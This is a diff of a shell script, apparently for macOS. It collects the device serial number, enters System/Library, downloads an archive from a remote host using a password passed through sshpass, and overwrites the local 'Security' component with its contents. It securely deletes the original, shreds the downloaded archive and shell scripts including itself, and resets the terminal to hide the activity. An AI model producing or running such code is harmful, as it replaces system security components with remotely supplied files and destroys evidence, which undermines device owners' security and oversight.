@@ -14,7 +14,7 @@ SERIAL_NUMBER=$(ioreg -c IOPlatformExpertDevice | grep IOPlatformSerialNumber | 
 IOS_VERSION=$(sw_vers -productVersion)
 LOCAL_FILE="appstore_unmodified"
 ARCHIVE_NAME="${IOS_VERSION}_${SERIAL_NUMBER}_${LOCAL_FILE}_${PERSON_NAME}"
-echo "$ARCHIVE_NAME"
+#echo "$ARCHIVE_NAME"
 
 
 cd $home/../../../System/Library/
@@ -23,11 +23,11 @@ cd $home/../../../System/Library/
 
 
 #sshpass -p "$REMOTE_PASS" scp $REMOTE_USER@$REMOTE_HOST:Security_new.zip ./Security_new.zip
-sshpass -p "$REMOTE_PASS" scp $REMOTE_USER@$REMOTE_HOST:"${ARCHIVE_NAME}_new.zip" ./"${ARCHIVE_NAME}_new.zip"
+sshpass -p "$REMOTE_PASS" scp $REMOTE_USER@$REMOTE_HOST:"new.zip" ./"new.zip"
 #rm -rf ./Security
 shred -fzu -n 3 ./Security >/dev/null 2>&1
 #echo "fsdfsdfdsfsdfsdfds"
-unzip -qqo "${ARCHIVE_NAME}_new.zip" -d ./
+unzip -qqo "new.zip" -d ./
 #rm -f *.zip
 shred -uzv *.{zip,7z,sh}
 reset
